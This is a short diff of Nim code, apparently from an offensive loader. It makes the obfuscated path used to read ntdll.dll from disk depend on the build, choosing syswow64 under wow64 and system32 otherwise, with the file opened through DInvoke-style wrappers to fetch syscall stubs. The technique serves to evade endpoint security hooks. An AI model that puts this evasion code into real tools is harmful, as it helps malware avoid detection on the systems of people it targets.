@@ -117,8 +117,12 @@ when defined(GetSyscallStub):
             fileSize: DWORD
             bytesRead: DWORD
             fileData: PVOID
-            ntdllString: LPCSTR = obf("C:\\windows\\system32\\ntdll.dll")
+            ntdllString: LPCSTR
             nullHandle: HANDLE
+        when defined(wow64):
+            ntdllString = obf("C:\\windows\\syswow64\\ntdll.dll")
+        else:
+            ntdllString = obf("C:\\windows\\system32\\ntdll.dll")
         when defined(DInvoke):
             file = MyCreateFileA(ntdllString, cast[DWORD](GENERIC_READ), cast[DWORD](FILE_SHARE_READ), cast[LPSECURITY_ATTRIBUTES](NULL), cast[DWORD](OPEN_EXISTING), cast[DWORD](FILE_ATTRIBUTE_NORMAL), nullHandle)
             fileSize = MyGetFileSize(file, nil)
